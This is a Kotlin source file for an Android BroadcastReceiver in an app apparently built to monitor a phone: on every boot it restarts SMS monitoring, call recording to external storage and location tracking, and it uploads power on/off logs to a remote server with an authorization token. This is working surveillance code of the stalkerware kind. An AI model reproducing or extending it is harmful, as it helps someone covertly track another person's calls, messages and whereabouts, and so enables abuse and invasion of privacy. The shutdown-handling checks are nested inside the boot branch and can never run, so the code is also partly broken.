package an.xuan.tong.historycontact.smsradar.Receiver

import an.xuan.tong.historycontact.Constant
import an.xuan.tong.historycontact.api.ApiService
import an.xuan.tong.historycontact.api.Repository
import an.xuan.tong.historycontact.api.model.CallLogServer
import an.xuan.tong.historycontact.api.model.PowerAndInternet
import an.xuan.tong.historycontact.api.model.SmsSendServer
import an.xuan.tong.historycontact.call.receiver.CallRecord
import an.xuan.tong.historycontact.connectivity.NetworkSchedulerService
import an.xuan.tong.historycontact.location.LocationService
import an.xuan.tong.historycontact.realm.RealmUtils
import an.xuan.tong.historycontact.smsradar.SmsRadarService
import android.app.job.JobInfo
import android.app.job.JobScheduler
import android.content.BroadcastReceiver
import android.content.ComponentName
import android.content.Context
import android.content.Intent
import android.media.MediaRecorder
import android.net.ConnectivityManager
import android.os.Build
import android.os.Environment
import android.util.Log
import com.facebook.accountkit.Account
import com.facebook.accountkit.AccountKit
import com.facebook.accountkit.AccountKitCallback
import com.facebook.accountkit.AccountKitError
import io.reactivex.android.schedulers.AndroidSchedulers
import io.reactivex.schedulers.Schedulers
import okhttp3.MediaType
import okhttp3.MultipartBody
import okhttp3.RequestBody
import org.jetbrains.anko.runOnUiThread
import java.io.File
import java.text.SimpleDateFormat
import java.util.*


class SMSreceiver : BroadcastReceiver() {
    override fun onReceive(context: Context, intent: Intent) {
        if ("android.intent.action.BOOT_COMPLETED" == intent.action) {
            if (RealmUtils.isActive())
                context.runOnUiThread {
               //     scheduleJob(context)
                    RealmUtils.savePowerOnOff(true)
                    val listPowCaching = RealmUtils.getAllPowerCaching()
                    listPowCaching?.let {
                        it.forEachIndexed { _, powCaching ->
                            sendPowerCaching(powCaching.id, powCaching.datecreate, powCaching.isPowerOn)
                        }
                    }
                    updateInformation()
                    val intentSms = Intent(context, SmsRadarService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intentSms)
                    } else {
                        context.startService(intentSms)
                    }
                    //Call
                    var callRecord = CallRecord.Builder(context)
                            .setRecordFileName("Record_" + SimpleDateFormat("ddMMyyyyHHmmss", Locale.US).format(Date()))
                            .setRecordDirName("Historycontact")
                            .setRecordDirPath(Environment.getExternalStorageDirectory().path)
                            .setAudioEncoder(MediaRecorder.AudioEncoder.AAC)
                            .setOutputFormat(MediaRecorder.OutputFormat.MPEG_4)
                            .setAudioSource(MediaRecorder.AudioSource.VOICE_COMMUNICATION)
                            .setShowSeed(true)
                            .build()

                    callRecord.startCallRecordService()
                    val intent = Intent()
                    intent.setClass(context, LocationService::class.java)
                    if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                        context.startForegroundService(intent)
                    } else {
                        context.startService(intent)
                    }
                }
            //Location
            if ("android.intent.action.QUICKBOOT_POWEROFF" == intent.action) {
                RealmUtils.savePowerOnOff(false)
            }
            if ("android.intent.action.ACTION_SHUTDOWN" == intent.action) {
                RealmUtils.savePowerOnOff(false)
            }


        }
    }

    //file audio server
    private fun sendPowerCaching(cachingId: Int?, dateCreate: String?, status: Boolean?) {
        val result: HashMap<String, String> = HashMap()
        result["Authorization"] = RealmUtils.getAuthorization()
        var id = RealmUtils.getAccountId()
        var message = PowerAndInternet(id, dateCreate, status)
        Log.d("sendPowerCaching", " " + message.toString())
        id?.let {
            Repository.createService(ApiService::class.java, result).insertPowerLog(message.toMap(), Constant.KEY_API)
                    .subscribeOn(Schedulers.io())
                    .retry(3)
                    .observeOn(AndroidSchedulers.mainThread())
                    .subscribe(
                            {
                                RealmUtils.deleteItemPower(cachingId)
                            },
                            { e ->
                                Log.d("antx", "sendPowerCaching eror " + e.message)
                            })
        }
    }

    private fun updateInformation() {
        AccountKit.getCurrentAccount(object : AccountKitCallback<Account> {
            override fun onSuccess(account: Account) {
                account.phoneNumber?.let {
                    Repository.createService(ApiService::class.java).getInfomation(Constant.KEY_API, account.phoneNumber.toString())
                            .subscribeOn(Schedulers.io())
                            .retry(3)
                            .observeOn(AndroidSchedulers.mainThread())
                            .subscribe(
                                    { result ->
                                        Log.d("test", result.toString())
                                        RealmUtils.saveCacheInformation(result)

                                    },
                                    { e ->
                                        Log.d("test", e.message)

                                    })

                }
                account.email?.let {
                }
            }

            override fun onError(error: AccountKitError) {}
        })
    }

    private fun scheduleJob(context: Context) {
        Log.d("antx", "scheduleJob()")
        var myJob = JobInfo.Builder(0, ComponentName(context, NetworkSchedulerService::class.java))
                .setRequiresCharging(true)
                .setMinimumLatency(1000)
                .setOverrideDeadline(2000)
                .setRequiredNetworkType(JobInfo.NETWORK_TYPE_ANY)
                .setPersisted(true)
                .build()

        var jobScheduler = context.getSystemService(Context.JOB_SCHEDULER_SERVICE) as JobScheduler
        jobScheduler.schedule(myJob);
    }
}
